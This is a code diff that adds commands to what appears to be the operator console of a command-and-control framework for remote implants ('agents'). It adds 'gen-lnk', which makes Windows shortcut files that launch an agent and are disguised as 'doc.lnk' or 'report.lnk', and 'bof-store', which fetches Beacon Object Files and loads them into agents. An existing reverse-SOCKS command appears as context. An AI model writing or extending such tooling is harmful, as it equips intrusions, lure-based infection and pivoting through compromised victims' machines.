@@ -1562,6 +1562,43 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
       } catch(e) { addConsoleOutput('', 'resolve error: '+e.message, null); return; }
       break;
     }
+
+    // gen-lnk <target.exe> [args] <out.lnk>
+    case 'gen-lnk': {
+      const gp = args.trim().split(/\s+/);
+      if (gp.length < 2) {
+        addConsoleOutput(
+          'uso: gen-lnk <target.exe> [cmd_args] <out.lnk>\n\nEjemplos:\n' +
+          '  gen-lnk C:\\\\Windows\\\\System32\\\\cmd.exe /c agent.exe C:\\\\Users\\\\Public\\\\doc.lnk\n' +
+          '  gen-lnk C:\\\\Temp\\\\agent.exe "" C:\\\\Users\\\\Public\\\\report.lnk', '', null);
+        return;
+      }
+      const glTarget = gp[0];
+      const glOut = gp[gp.length - 1];
+      const glArgs = gp.slice(1, -1).join(' ');
+      taskType = 'GEN_LNK';
+      taskArgs = JSON.stringify({target: glTarget, args: glArgs, outfile: glOut});
+      break;
+    }
+
+    // bof-store load <name> <file.coff>  |  bof-store list  |  bof-store unload <name>
+    case 'bof-store': {
+      const [bs,...br] = args.split(' ');
+      if (bs === 'list') { taskType = 'BOF_STORE_LIST'; }
+      else if (bs === 'unload') { taskType = 'BOF_STORE_UNLOAD'; taskArgs = br[0] || ''; }
+      else if (bs === 'load') {
+        const bofName = br[0] || ''; const bofFile = br[1] || br[0] || '';
+        if (!bofName || !bofFile) { addConsoleOutput('usage: bof-store load <name> <file.coff>', '', null); return; }
+        addConsoleOutput(`[*] Fetching ${bofFile}…`, '', null);
+        try {
+          const bofBytes = await fetchSCFile(bofFile);
+          payload = u8ToB64(bofBytes);
+          taskType = 'BOF_STORE_LOAD'; taskArgs = bofName;
+        } catch(e) { addConsoleOutput('', e.message, null); return; }
+      }
+      break;
+    }
+
     case 'rsocks': {
       const [sub5,...r5] = args.split(' ');
       taskType = sub5==='start' ? 'RSOCKS_START' : 'RSOCKS_STOP';
